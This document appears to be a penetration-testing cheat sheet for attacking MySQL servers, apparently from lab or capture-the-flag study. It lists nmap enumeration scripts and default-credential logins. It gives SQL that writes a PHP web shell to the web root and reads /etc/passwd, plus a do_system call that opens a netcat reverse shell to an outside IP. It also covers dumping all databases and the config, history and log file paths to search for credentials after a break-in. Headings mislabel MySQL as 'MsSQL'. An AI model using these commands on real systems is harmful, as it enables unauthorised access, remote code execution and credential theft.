## Nmap

```
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306

nmap -sV -Pn -vv -script=mysql* $ip -p 3306
```
# Connecting to MsSQL from Target

```
mysql -u root 
# Connect to root without password

mysql -u root -p 
# A password will be asked

# Always test root:root credential
```

# Connecting to MsSQL from Attacker

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

## MySQL Commands

| Command                                                                                   | Description                                                                                   |
| ----------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `SHOW DATABASES;`                                                                         | Show all available databases in MySQL.                                                        |
| `USE htbusers;`                                                                           | Select a specific database in MySQL.                                                          |
| `SHOW TABLES;`                                                                            | Show all available tables in the selected database in MySQL.                                  |
| `SELECT * FROM users;`                                                                    | Select all available entries from the "users" table in MySQL.                                 |
| `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL.                                                                    |
| `show variables like "secure_file_priv";`                                                 | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `select LOAD_FILE("/etc/passwd");`                                                        | Read local files in MySQL.                                                                    |
# If running as root

```
select do_system('nc 192.168.49.136 8080 -e /bin/bash');
```

# Getting all the information from inside the database

```
mysqldump -u admin -p admin --all-databases --skip-lock-tables 
```

# Post Enumeration

Here are list of some files to check after shell on target system to get some credentials or some juicy information that help to get root easily

## Configuration file

### Unix

```
my.cnf
/etc/mysql
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf
```

### Windows

```
config.ini
my.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/
```

## Command History

```
~/.mysql.history
```

## Log Files

```
connections.log
update.log
common.log
```

## Finding passwords to MySQL

```
/var/www/html/configuration.php
```